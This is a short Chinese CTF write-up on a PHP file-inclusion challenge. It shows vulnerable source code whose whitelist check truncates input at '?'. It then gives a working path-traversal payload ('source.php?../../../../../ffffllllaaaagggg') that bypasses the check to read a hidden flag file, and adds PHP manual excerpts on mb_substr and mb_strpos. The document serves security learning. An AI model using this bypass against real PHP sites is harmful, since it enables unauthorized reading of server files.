#PHP #代码审计 #文件包含

HTML 注释里提示有 source.php
查看 source.php

```php
<?php
highlight_file(__FILE__);
class emmm
{
    public static function checkFile(&$page)
    {
        $whitelist = ["source" => "source.php", "hint" => "hint.php"];
        if (!isset($page) || !is_string($page)) {
            echo "you can't see it";
            return false;
        }

        if (in_array($page, $whitelist)) {
            return true;
        }

        $_page = mb_substr(
            $page,
            0,
            mb_strpos($page . '?', '?')
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }

        $_page = urldecode($page);
        $_page = mb_substr(
            $_page,
            0,
            mb_strpos($_page . '?', '?')
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }
        echo "you can't see it";
        return false;
    }
}

if (
    !empty($_REQUEST['file'])
    && is_string($_REQUEST['file'])
    && emmm::checkFile($_REQUEST['file'])
) {
    include $_REQUEST['file'];
    exit;
} else {
    echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
}
```

我们期望在 checkFile 返回 true

1. file=source.php 或 file=hint,php
2. 先给 file 后面加一个 ？ ，file 中第一个问号之前的内容满足 1

```url
?file=hint.php
```

回显 flag not here, and flag in ffffllllaaaagggg
尝试得出 payload：

```url
?file=source.php?../../../../../ffffllllaaaagggg
```

```php
mb_substr(
    string $string,
    int $start,
    ?int $length = null,
    ?string $encoding = null
): string
 获取部分字符串
```

- string : 从该  string  中提取子字符串。
- start : 如果  `start`  不是负数，返回的字符串会从  `string`  第  `start`  的位置开始，从 0 开始计数。举个例子，字符串 '`abcdef`'，位置  `0`  的字符是 '`a`'，位置  `2`  的字符是 '`c`'，以此类推。如果  `start`  是负数，返回的字符串是从  `string`  末尾处第  `start`  个字符开始的。
- length : `string`  中要使用的最大字符数。如果省略了此参数或者传入了  `NULL`，则会提取到字符串的尾部。
- encoding : `encoding`  参数为字符编码。如果省略或是  **`null`**，则使用内部字符编码。

```php
mb_strpos(
    string `$haystack`,
    string `$needle`,
    int `$offset` = 0,
    ?string `$encoding` = **`null`**
): int|false
查找字符串在另一个字符串中首次出现的位置
```

- haystack : 要被检查的  string。
- needle : 在  `haystack`  中查找这个字符串。 和  [strpos()](https://www.php.net/manual/zh/function.strpos.php)  不同的是，数字的值不会被当做字符的顺序值。
- offset : 搜索位置的偏移。如果没有提供该参数，将会使用 0。负数的 offset 会从字符串尾部开始统计。
- encoding : `encoding`  参数为字符编码。如果省略或是  **`null`**，则使用内部字符编码。
